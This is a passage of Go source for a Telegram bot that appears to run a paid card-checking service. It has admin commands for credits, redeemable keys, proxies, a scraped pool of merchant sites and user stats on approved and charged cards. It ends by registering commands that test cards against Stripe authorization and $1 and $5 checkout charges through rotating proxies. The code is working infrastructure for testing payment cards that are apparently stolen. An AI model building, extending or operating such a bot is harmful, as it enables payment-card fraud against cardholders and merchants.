			cfg.DynamicAdmins = append(cfg.DynamicAdmins, uid)
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf(" User %d added as admin.", uid))
	})

	bot.Handle("/rmadmin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmadmin &lt;user_id&gt;")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(" Invalid user ID.")
		}
		if adminIDs[uid] {
			return c.Send(" Cannot remove hardcoded admin.")
		}
		cfg.mu.Lock()
		newList := cfg.DynamicAdmins[:0]
		for _, a := range cfg.DynamicAdmins {
			if a != uid {
				newList = append(newList, a)
			}
		}
		cfg.DynamicAdmins = newList
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf(" User %d removed from admins.", uid))
	})

	bot.Handle("/setdefaultcredits", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		amount, err := strconv.ParseFloat(strings.TrimSpace(c.Message().Payload), 64)
		if err != nil || amount < 0 {
			return c.Send("Usage: /setdefaultcredits <amount>\nExample: /setdefaultcredits 100")
		}
		cfg.mu.Lock()
		cfg.DefaultCredits = amount
		cfg.mu.Unlock()
		cfg.Save()

		um.mu.Lock()
		count := 0
		for _, ud := range um.users {
			ud.Credits += amount
			count++
		}
		um.mu.Unlock()
		um.Save()

		return c.Send(fmt.Sprintf(" Default credits set to %s.\nGranted %s to %d existing users.", strconvFloat(amount), strconvFloat(amount), count), tele.ModeHTML)
	})

	bot.Handle("/addcredit", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		parts := strings.Fields(c.Message().Payload)
		if len(parts) < 2 {
			return c.Send("Usage: /addcredit &lt;@username|user_id&gt; &lt;amount&gt;")
		}
		target := parts[0]
		amount, err := strconv.ParseFloat(parts[1], 64)
		if err != nil || amount <= 0 {
			return c.Send(" Invalid amount. Must be a positive number (decimals allowed).")
		}
		var targetUID int64
		if strings.HasPrefix(target, "@") {
			uid, found := um.FindByUsername(target)
			if !found {
				return c.Send(fmt.Sprintf(" No known user with username %s.", target))
			}
			targetUID = uid
		} else {
			uid, err := strconv.ParseInt(target, 10, 64)
			if err != nil {
				return c.Send(" Invalid user ID or username.")
			}
			targetUID = uid
		}
		newBalance := um.AddCredits(targetUID, amount)
		um.Save()
		amountStr := strconvFloat(amount)
		bot.Send(tele.ChatID(targetUID), " "+amountStr+" Credits was added to your balance.\n\n New balance: "+strconvFloat(newBalance)+"", tele.ModeHTML)
		return c.Send(" Added " + amountStr + " credits to user " + strconv.FormatInt(targetUID, 10) + ". New balance: " + strconvFloat(newBalance) + "", tele.ModeHTML)
	})

	bot.Handle("/removecredit", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		parts := strings.Fields(c.Message().Payload)
		if len(parts) < 2 {
			return c.Send("Usage: /removecredit &lt;@username|user_id&gt; &lt;amount&gt;")
		}
		target := parts[0]
		amount, err := strconv.ParseFloat(parts[1], 64)
		if err != nil || amount <= 0 {
			return c.Send(" Invalid amount. Must be a positive number.")
		}
		var targetUID int64
		if strings.HasPrefix(target, "@") {
			uid, found := um.FindByUsername(target)
			if !found {
				return c.Send(fmt.Sprintf(" No known user with username %s.", target))
			}
			targetUID = uid
		} else {
			uid, err := strconv.ParseInt(target, 10, 64)
			if err != nil {
				return c.Send(" Invalid user ID or username.")
			}
			targetUID = uid
		}
		um.DeductCredits(targetUID, amount)
		newBalance := um.GetCredits(targetUID)
		if newBalance < 0 {
			newBalance = 0
		}
		um.Save()
		amountStr := strconvFloat(amount)
		bot.Send(tele.ChatID(targetUID), " "+amountStr+" Credits was removed from your balance.\n\n New balance: "+strconvFloat(newBalance)+"", tele.ModeHTML)
		return c.Send(" Removed " + amountStr + " credits from user " + strconv.FormatInt(targetUID, 10) + ". New balance: " + strconvFloat(newBalance) + "", tele.ModeHTML)
	})

	bot.Handle("/checkcredit", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		parts := strings.Fields(c.Message().Payload)
		if len(parts) < 1 {
			return c.Send("Usage: /checkcredit &lt;@username|user_id&gt;")
		}
		target := parts[0]
		var targetUID int64
		if strings.HasPrefix(target, "@") {
			uid, found := um.FindByUsername(target)
			if !found {
				return c.Send(fmt.Sprintf(" No known user with username %s.", target))
			}
			targetUID = uid
		} else {
			uid, err := strconv.ParseInt(target, 10, 64)
			if err != nil {
				return c.Send(" Invalid user ID or username.")
			}
			targetUID = uid
		}
		ud := um.GetExisting(targetUID)
		if ud == nil {
			return c.Send(fmt.Sprintf(" User %d not found.", targetUID))
		}
		um.mu.RLock()
		credits := ud.Credits
		username := ud.Username
		dailyCount := ud.DailyCount
		stats := ud.Stats
		um.mu.RUnlock()
		hasUnlimited := um.HasUnlimited(targetUID)
		limit := currentDailyLimit()

		creditsStr := strconvFloat(credits)
		if hasUnlimited {
			creditsStr = "Unlimited"
		}
		unlimitedStr := "No"
		if hasUnlimited {
			unlimitedStr = "Yes"
		}
		approvedRate, chargedRate := 0.0, 0.0
		if stats.TotalChecked > 0 {
			approvedRate = float64(stats.TotalApproved) * 100.0 / float64(stats.TotalChecked)
			chargedRate = float64(stats.TotalCharged) * 100.0 / float64(stats.TotalChecked)
		}
		return c.Send(fmt.Sprintf(
			"????????????????????????????\n"+
				"    "+em(emojiUser, "\xf0\x9f\x91\xa4")+" <b>User Credit Profile</b> "+em(emojiUser, "\xf0\x9f\x91\xa4")+"\n"+
				"????????????????????????????\n\n"+
				em(emojiBlue, "\xf0\x9f\x94\xb5")+" <b>User ID</b> -> <code>%d</code>\n"+
				em(emojiUser, "\xf0\x9f\x91\xa4")+" <b>Username</b> -> @%s\n"+
				em(emojiPrice, "\xf0\x9f\x92\xb0")+" <b>Credits</b> -> %s\n"+
				em(emojiStar, "\xe2\xad\x90")+" <b>Unlimited</b> -> %s\n"+
				em(emojiCalendar, "\xf0\x9f\x93\x85")+" <b>Daily</b> -> %d / %d\n\n"+
				"------------------------------\n"+
				em(emojiRowCheck, "\xe2\x9c\x85")+" <b>Total Checked</b>  :  %d\n"+
				em(emojiRowAppr, "\xe2\x9c\x85")+" <b>Approved</b>       :  %d\n"+
				em(emojiRowDecl, "\xe2\x9d\x8c")+" <b>Declined</b>       :  %d\n"+
				em(emojiRowCard, "\xf0\x9f\x92\xb3")+" <b>Charged</b>        :  %d\n"+
				em(emojiMoney, "\xf0\x9f\x92\xb0")+" <b>Charged Amount</b> :  $%.2f\n"+
				"------------------------------\n\n"+
				em(emojiHitRate, "\xf0\x9f\x8e\xaf")+" <b>Approved Rate</b> : %.1f%%\n"+
				em(emojiRowCard, "\xf0\x9f\x92\xb3")+" <b>Charged Rate</b>  :  %.1f%%\n"+
				"????????????????????????????",
			targetUID, html.EscapeString(username), creditsStr, unlimitedStr, dailyCount, limit,
			stats.TotalChecked, stats.TotalApproved, stats.TotalDeclined, stats.TotalCharged,
			stats.TotalChargedAmt, approvedRate, chargedRate), tele.ModeHTML)
	})

	bot.Handle("/redeem", func(c tele.Context) error {
		uid := c.Sender().ID
		fullText := c.Message().Text
		fmt.Printf("[REDEEM] uid=%d text=%q\n", uid, fullText)
		idx := strings.Index(fullText, "/redeem")
		if idx < 0 {
			fmt.Printf("[REDEEM] no '/redeem' found in text\n")
			return c.Send("Usage: /redeem <key>")
		}
		after := strings.TrimSpace(fullText[idx+len("/redeem"):])
		if strings.HasPrefix(after, "@") {
			if sp := strings.IndexByte(after, ' '); sp >= 0 {
				after = strings.TrimSpace(after[sp:])
			} else {
				after = ""
			}
		}
		if after == "" {
			fmt.Printf("[REDEEM] empty key after parse\n")
			return c.Send("Usage: /redeem <key>")
		}
		code := after
		fmt.Printf("[REDEEM] parsed code=%q\n", code)
		um.SetUsername(uid, c.Sender().Username)
		key, err := km.Redeem(code, uid)
		if err != nil {
			fmt.Printf("[REDEEM] Redeem() error: %v\n", err)
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" "+err.Error(), tele.ModeHTML)
		}
		fmt.Printf("[REDEEM] success type=%s code=%s\n", key.Type, key.Code)
		if key.Type == "credits" {
			um.AddCredits(uid, float64(key.Credits))
			um.Save()
			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Key redeemed! %d credits added to your balance.", key.Credits), tele.ModeHTML)
		}
		if key.Type == "unlimited" {
			var until int64
			if key.ExpiresAt > 0 {
				until = key.ExpiresAt
			} else {
				until = time.Now().Add(100 * 365 * 24 * time.Hour).Unix()
			}
			um.SetUnlimited(uid, until)
			um.Save()
			if key.ExpiresAt > 0 {
				expStr := time.Unix(key.ExpiresAt, 0).Format("2006-01-02 15:04")
				return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Unlimited access activated until %s", expStr), tele.ModeHTML)
			}
			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+" Unlimited access activated permanently!", tele.ModeHTML)
		}
		return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Unknown key type.", tele.ModeHTML)
	})

	bot.Handle("/genkey", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		parts := strings.Fields(c.Message().Payload)
		if len(parts) < 2 {
			return c.Send("Usage: /genkey &lt;credits|unlimited&gt; &lt;amount|duration_hours&gt;\nExample: /genkey credits 100\n          /genkey unlimited 24\n          /genkey unlimited permanent")
		}
		keyType := parts[0]
		if keyType != "credits" && keyType != "unlimited" {
			return c.Send("Type must be 'credits' or 'unlimited'")
		}
		if keyType == "credits" {
			credits, err := strconv.ParseInt(parts[1], 10, 64)
			if err != nil || credits <= 0 {
				return c.Send(" Credits must be a positive number")
			}
			key, _ := km.Generate("credits", credits, "")
			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Key generated:\n%s\nType: credits\nAmount: %d", key.Code, key.Credits), tele.ModeHTML)
		}
		key, _ := km.Generate("unlimited", 0, parts[1])
		durStr := parts[1] + " hours"
		if parts[1] == "permanent" {
			durStr = "permanent"
		}
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Key generated:\n%s\nType: unlimited\nDuration: %s", key.Code, durStr), tele.ModeHTML)
	})

	bot.Handle("/keys", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		active := km.Active()
		if len(active) == 0 {
			return c.Send(" No active keys.")
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf(" Active Keys (%d):\n\n", len(active)))
		for i, key := range active {
			created := time.Unix(key.CreatedAt, 0).Format("01-02 15:04")
			sb.WriteString(fmt.Sprintf("%d. %s\n   %s | %s\n   Created: %s\n", i+1, key.Code, key.Type, key.Duration, created))
		}
		return c.Send(sb.String(), tele.ModeHTML)
	})

	bot.Handle("/allkeys", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		all := km.AllHistory()
		if len(all) == 0 {
			return c.Send(" No keys in history.")
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf(" All Keys (%d):\n\n", len(all)))
		for i, key := range all {
			created := time.Unix(key.CreatedAt, 0).Format("01-02 15:04")
			status := "active"
			if !key.Active {
				status = "deactivated"
			}
			if key.ActivatedAt > 0 {
				status += " (redeemed)"
			}
			sb.WriteString(fmt.Sprintf("%d. %s | %s | %s | %s | %s\n", i+1, key.Code, key.Type, key.Duration, created, status))
		}
		return c.Send(sb.String(), tele.ModeHTML)
	})

	bot.Handle("/deactivate", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		code := strings.TrimSpace(c.Message().Payload)
		if code == "" {
			return c.Send("Usage: /deactivate &lt;key&gt;")
		}
		if km.Deactivate(code) {
			return c.Send(" Key deactivated: " + code)
		}
		return c.Send(" Key not found.")
	})

	bot.Handle("/deactivateall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		count := km.DeactivateAll()
		return c.Send(fmt.Sprintf(" Deactivated %d key(s).", count))
	})

	bot.Handle("/delkey", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		code := strings.TrimSpace(c.Message().Payload)
		if code == "" {
			return c.Send("Usage: /delkey &lt;key&gt;")
		}
		if km.Delete(code) {
			return c.Send(" Key deleted: " + code)
		}
		return c.Send(" Key not found.")
	})

	bot.Handle("/delallkeys", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		count := km.DeleteAll()
		return c.Send(fmt.Sprintf(" Deleted %d key(s).", count))
	})

	bot.Handle("/free", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		cfg.mu.Lock()
		cfg.FreeMode = !cfg.FreeMode
		state := cfg.FreeMode
		cfg.mu.Unlock()
		cfg.Save()
		if state {
			return c.Send(" Free mode ON - all users can check without credits.")
		}
		return c.Send(" Free mode OFF - normal credit system active.")
	})

	bot.Handle("/editfreelimit", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /editfreelimit &lt;amount&gt;")
		}
		limit, err := strconv.ParseInt(raw, 10, 64)
		if err != nil || limit < 0 {
			return c.Send(" Invalid amount.")
		}
		cfg.mu.Lock()
		cfg.DailyLimit = limit
		cfg.mu.Unlock()
		cfg.Save()
		dailyFreeLimit = limit
		return c.Send(fmt.Sprintf(" Daily free limit set to %d.", limit))
	})

	bot.Handle("/scrsites", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		allSites := make(map[string]bool)
		for _, s := range getCustomSites() {
			allSites[s] = true
		}
		sitePoolMu.RLock()
		for _, s := range sitePool {
			allSites[s] = true
		}
		sitePoolMu.RUnlock()
		sitePoolMu.RLock()
		poolCount := len(sitePool)
		sitePoolMu.RUnlock()
		var list []string
		for s := range allSites {
			list = append(list, s)
		}
		sort.Strings(list)
		buf := bytes.NewBufferString(strings.Join(list, "\n"))
		doc := &tele.Document{
			File:     tele.FromReader(buf),
			FileName: "sites_pool.txt",
			Caption:  fmt.Sprintf(" Site Pool (%d sites)\nPool: %d", len(list), poolCount),
		}
		return c.Send(doc)
	})

	bot.Handle("/pvtbroadcast", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
		if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
			return c.Send("Usage: /pvtbroadcast &lt;user_id&gt; &lt;message&gt;")
		}
		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
		if err != nil {
			return c.Send(" Invalid user ID.")
		}
		msg := strings.TrimSpace(parts[1])
		_, err = bot.Send(tele.ChatID(uid), " "+msg, tele.ModeHTML)
		if err != nil {
			return c.Send(fmt.Sprintf(" Failed to send: %v", err))
		}
		return c.Send(fmt.Sprintf(" Message sent to %d.", uid))
	})
	bot.Handle("/forcejoin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		payload := strings.TrimSpace(c.Message().Payload)
		if payload == "" {
			cfg.mu.RLock()
			enabled := cfg.ForceJoinEnabled
			targets := cfg.ForceJoin
			cfg.mu.RUnlock()
			var sb strings.Builder
			sb.WriteString(" Force-Join Status:\n")
			sb.WriteString(fmt.Sprintf("Enabled: %v\n", enabled))
			if len(targets) == 0 {
				sb.WriteString("Targets: (none)\n")
			} else {
				sb.WriteString(fmt.Sprintf("Targets (%d):\n", len(targets)))
				for i, t := range targets {
					title := t.Title
					if title == "" {
						title = "untitled"
					}
					sb.WriteString(fmt.Sprintf("%d. %d - %s\n", i+1, t.ChatID, title))
				}
			}
			sb.WriteString("\nUsage:\n")
			sb.WriteString("/forcejoin on\n")
			sb.WriteString("/forcejoin off\n")
			sb.WriteString("/forcejoin add &lt;chat_id&gt; &lt;invite_url&gt; [title]\n")
			sb.WriteString("/forcejoin rm &lt;chat_id&gt;\n")
			sb.WriteString("/forcejoin clear")
			return c.Send(sb.String())
		}
		parts := strings.Fields(payload)
		switch parts[0] {
		case "on":
			cfg.mu.Lock()
			cfg.ForceJoinEnabled = true
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send(" Force-join enabled.")
		case "off":
			cfg.mu.Lock()
			cfg.ForceJoinEnabled = false
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send(" Force-join disabled.")
		case "clear":
			cfg.mu.Lock()
			cfg.ForceJoin = nil
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send(" All force-join targets cleared.")
		case "add":
			if len(parts) < 3 {
				return c.Send("Usage: /forcejoin add &lt;chat_id&gt; &lt;invite_url&gt; [title]")
			}
			chatID, err := strconv.ParseInt(parts[1], 10, 64)
			if err != nil {
				return c.Send(" Invalid chat ID.")
			}
			url := parts[2]
			title := ""
			if len(parts) > 3 {
				title = strings.Join(parts[3:], " ")
			}
			cfg.mu.Lock()
			for _, t := range cfg.ForceJoin {
				if t.ChatID == chatID {
					cfg.mu.Unlock()
					return c.Send(" That chat ID is already in the list.")
				}
			}
			cfg.ForceJoin = append(cfg.ForceJoin, ForceJoinTarget{ChatID: chatID, InviteURL: url, Title: title})
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send(fmt.Sprintf(" Added force-join target: %d (%s)", chatID, title))
		case "rm":
			if len(parts) < 2 {
				return c.Send("Usage: /forcejoin rm &lt;chat_id&gt;")
			}
			chatID, err := strconv.ParseInt(parts[1], 10, 64)
			if err != nil {
				return c.Send(" Invalid chat ID.")
			}
			cfg.mu.Lock()
			newList := make([]ForceJoinTarget, 0, len(cfg.ForceJoin))
			removed := false
			for _, t := range cfg.ForceJoin {
				if t.ChatID == chatID {
					removed = true
					continue
				}
				newList = append(newList, t)
			}
			cfg.ForceJoin = newList
			cfg.mu.Unlock()
			cfg.Save()
			if !removed {
				return c.Send(" Chat ID not found in list.")
			}
			return c.Send(fmt.Sprintf(" Removed force-join target: %d", chatID))
		}
		return c.Send("Unknown subcommand. Use: on, off, add, rm, clear")
	})

	bot.Handle("/giveperm", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
		if len(parts) < 2 {
			return c.Send("Usage: /giveperm &lt;user_id&gt; &lt;command&gt;")
		}
		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID.", tele.ModeHTML)
		}
		cmd := strings.TrimSpace(parts[1])
		key := strconv.FormatInt(uid, 10)
		cfg.mu.Lock()
		for _, p := range cfg.Perms[key] {
			if p == cmd {
				cfg.mu.Unlock()
				return c.Send(fmt.Sprintf("User %d already has permission for /%s.", uid, cmd))
			}
		}
		cfg.Perms[key] = append(cfg.Perms[key], cmd)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d granted permission for /%s.", uid, cmd), tele.ModeHTML)
	})

	bot.Handle("/users", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.RLock()
		allowed := make([]int64, 0, len(cfg.AllowedUsers))
		for uid := range cfg.AllowedUsers {
			allowed = append(allowed, uid)
		}
		cfg.mu.RUnlock()
		if len(allowed) == 0 {
			return c.Send("Allowed Users List\n\nNo users in the allowed list.\n\nUse /allowuser &lt;id&gt; to add users.")
		}
		sort.Slice(allowed, func(i, j int) bool { return allowed[i] < allowed[j] })
		var sb strings.Builder
		sb.WriteString("Allowed Users List\n\n")
		for i, uid := range allowed {
			sb.WriteString(fmt.Sprintf("%d. %d\n", i+1, uid))
		}
		sb.WriteString(fmt.Sprintf("\nTotal: %d user(s)", len(allowed)))
		return c.Send(sb.String())
	})

	bot.Handle("/show", func(c tele.Context) error {
		uid := c.Sender().ID
		targetID := uid
		raw := strings.TrimSpace(c.Message().Payload)
		if raw != "" {
			if !isAdmin(uid) {
				return c.Send("Ys Only admins can view other users' proxies.")
			}
			n, err := strconv.ParseInt(raw, 10, 64)
			if err != nil {
				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID.", tele.ModeHTML)
			}
			targetID = n
		}
		proxies := um.GetProxies(targetID)
		if len(proxies) == 0 {
			if targetID == uid {
				return c.Send("O You have no proxies set.")
			}
			return c.Send(fmt.Sprintf("O User %d has no proxies.", targetID))
		}
		var sb strings.Builder
		if targetID == uid {
			sb.WriteString(fmt.Sprintf("Your proxies (%d):\n\n", len(proxies)))
		} else {
			sb.WriteString(fmt.Sprintf("User %d proxies (%d):\n\n", targetID, len(proxies)))
		}
		for i, p := range proxies {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, p))
		}
		return c.Send(sb.String())
	})

	bot.Handle("/cleanproxies", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		cleaned := 0
		um.mu.Lock()
		for _, ud := range um.users {
			var valid []string
			for _, p := range ud.Proxies {
				p = strings.TrimSpace(p)
				if p != "" && (strings.HasPrefix(p, "http://") || strings.HasPrefix(p, "https://") || strings.HasPrefix(p, "socks5://") || strings.HasPrefix(p, "socks5h://") || strings.HasPrefix(p, "socks4://") || strings.HasPrefix(p, "socks4a://")) {
					valid = append(valid, p)
				} else {
					cleaned++
				}
			}
			ud.Proxies = valid
		}
		um.mu.Unlock()
		um.Save()
		return c.Send(fmt.Sprintf("o. Cleaned %d invalid proxy entry/entries.", cleaned))
	})

	bot.Handle("/chkpr", func(c tele.Context) error {
		uid := c.Sender().ID
		targetID := uid
		raw := strings.TrimSpace(c.Message().Payload)
		if raw != "" {
			if !isAdmin(uid) {
				return c.Send("Ys Only admins can test other users' proxies.")
			}
			n, err := strconv.ParseInt(raw, 10, 64)
			if err != nil {
				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID.", tele.ModeHTML)
			}
			targetID = n
		}
		proxies := um.GetProxies(targetID)
		if len(proxies) == 0 {
			return c.Send("O No proxies to test.")
		}
		msg, _ := bot.Send(c.Chat(), fmt.Sprintf("Testing %d proxies...", len(proxies)))
		type result struct {
			proxy string
			ok    bool
		}
		results := make([]result, len(proxies))
		var wg sync.WaitGroup
		for i, p := range proxies {
			wg.Add(1)
			go func(idx int, proxy string) {
				defer wg.Done()
				err := testProxy(proxy)
				results[idx] = result{proxy: proxy, ok: err == nil}
			}(i, p)
		}
		wg.Wait()
		good, bad := 0, 0
		var sb strings.Builder
		if targetID == uid {
			sb.WriteString("Proxy Test Results:\n\n")
		} else {
			sb.WriteString(fmt.Sprintf("Proxy Test Results for %d:\n\n", targetID))
		}
		for _, r := range results {
			if r.ok {
				sb.WriteString(fmt.Sprintf("o. %s\n", r.proxy))
				good++
			} else {
				sb.WriteString(fmt.Sprintf("O %s\n", r.proxy))
				bad++
			}
		}
		sb.WriteString(fmt.Sprintf("\no. Working: %d  O Dead: %d", good, bad))
		if msg != nil {
			bot.Edit(msg, sb.String())
			return nil
		}
		return c.Send(sb.String())
	})

	bot.Handle("/stopuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /stopuser &lt;@username&gt; or /stopuser &lt;user_id&gt;")
		}

	var targetUID int64
	var found bool

	if strings.HasPrefix(raw, "@") {
		needle := strings.ToLower(strings.TrimPrefix(raw, "@"))
		allActiveSessions.Range(func(_, val any) bool {
			sess := val.(*CheckSession)
			if strings.ToLower(sess.Username) == needle {
				targetUID = sess.UserID
				found = true
				return false
			}
			return true
		})
		if !found {
			return c.Send(fmt.Sprintf("s No active session for %s.", raw))
		}
	} else {
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("O Invalid argument. Use @username or a numeric user ID.")
		}
		targetUID = uid
		allActiveSessions.Range(func(_, val any) bool {
			s := val.(*CheckSession)
			if s.UserID == targetUID {
				found = true
				return false
			}
			return true
		})
		if !found {
			return c.Send(fmt.Sprintf("s No active session for user %d.", targetUID))
		}
	}

	stopped := stopAllUserSessions(targetUID)
	if stopped == 0 {
		return c.Send(fmt.Sprintf("s No active session for user %d.", targetUID))
	}
	return c.Send(fmt.Sprintf("Y>' Stopped %d session(s) for user %d.", stopped, targetUID))
	})

	bot.Handle("/resetactive", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancelled.Store(true)
			if sess.Cancel != nil {
				sess.Cancel()
			}
			unregisterSession(sess)
			count++
			return true
		})
		return c.Send(fmt.Sprintf("Y>' Force-cancelled %d session(s). Active sessions cleared.", count))
	})

	bot.Handle("/reboot", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		c.Send("Rebooting bot...")
		go func() {
			time.Sleep(500 * time.Millisecond)
			os.Exit(0)
		}()
		return nil
	})

	bot.Handle("/addgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /addgp &lt;group_id&gt; [&lt;group_id&gt; ...]")
		}
		cfg.mu.Lock()
		for _, tok := range strings.Fields(arg) {
			gid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err != nil {
				continue
			}
			found := false
			for _, g := range cfg.Groups {
				if g == gid {
					found = true
					break
				}
			}
			if !found {
				cfg.Groups = append(cfg.Groups, gid)
			}
		}
		groups := cfg.Groups
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("o. Allowed groups: %v", groups))
	})

	bot.Handle("/showgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.RLock()
		groups := make([]int64, len(cfg.Groups))
		copy(groups, cfg.Groups)
		groupsOnly := cfg.GroupsOnly
		cfg.mu.RUnlock()
		var sb strings.Builder
		sb.WriteString("Allowed groups:\n")
		if len(groups) == 0 {
			sb.WriteString("(none)\n")
		} else {
			for _, g := range groups {
				sb.WriteString(fmt.Sprintf(" %d\n", g))
			}
		}
		sb.WriteString(fmt.Sprintf("\nGroups-only mode: %v", groupsOnly))
		return c.Send(sb.String())
	})

	bot.Handle("/delgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /delgp &lt;group_id&gt; [&lt;group_id&gt; ...]")
		}
		cfg.mu.Lock()
		toRemove := make(map[int64]bool)
		for _, tok := range strings.Fields(arg) {
			gid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err == nil {
				toRemove[gid] = true
			}
		}
		newList := cfg.Groups[:0]
		for _, g := range cfg.Groups {
			if !toRemove[g] {
				newList = append(newList, g)
			}
		}
		cfg.Groups = newList
		groups := cfg.Groups
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("o. Removed. Current allowed groups: %v", groups))
	})

	bot.Handle("/onlygp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.GroupsOnly = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send("Groups-only mode enabled. Private chats are denied unless /allowuser is set.")
	})

	bot.Handle("/allowall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.GroupsOnly = false
		cfg.AllowOnlyIDs = nil
		cfg.RestrictAll = false
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send("Bot set to allow all users in personal chats.")
	})

	registerStripeInline(bot, "/str", "Stripe Auth", um, checkStripeAuthCard)
	registerStripeInline(bot, "/mstr", "Stripe Auth", um, checkStripeAuthCard)
	registerStripeFile(bot, "/mstrtxt", "Stripe Auth", um, checkStripeAuthCard)
	registerStripeInline(bot, "/str1", "Stripe UHQ $1", um, checkStripeCheckoutCard)
	registerStripeInline(bot, "/mstr1", "Stripe UHQ $1", um, checkStripeCheckoutCard)
	registerStripeFile(bot, "/mstr1txt", "Stripe UHQ $1", um, checkStripeCheckoutCard)
	registerStripeInline(bot, "/str2", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
